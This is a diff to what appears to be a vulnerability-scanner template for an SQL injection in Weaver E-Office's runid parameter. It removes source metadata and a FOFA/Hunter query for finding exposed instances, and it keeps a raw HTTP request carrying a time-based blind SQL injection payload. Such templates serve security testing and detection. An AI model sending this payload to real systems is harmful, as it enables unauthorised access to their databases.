@@ -3,14 +3,8 @@ info:
   name: 泛微E-Officerunid存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4e28f1d7f203391048d51463e4347b9c
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 4e28f1d7f203391048d51463e4347b9c
-    fofa: + hunter`app.name="泛微 e-office OA"`
 http:
 - raw:
   - 'GET /E-mobile/flow/forwardsucess.php?runid=1+AND+9926%3DBENCHMARK%285000000%2CMD5%280x7156734e%29%29&flowid=&flowprcs=&prcsid=&module=&scope=&page=&fromid=&detailid=&mobilesessionkey=&sessionkey=&diff=&contents=1&touserid=WV00000304 HTTP/1.1
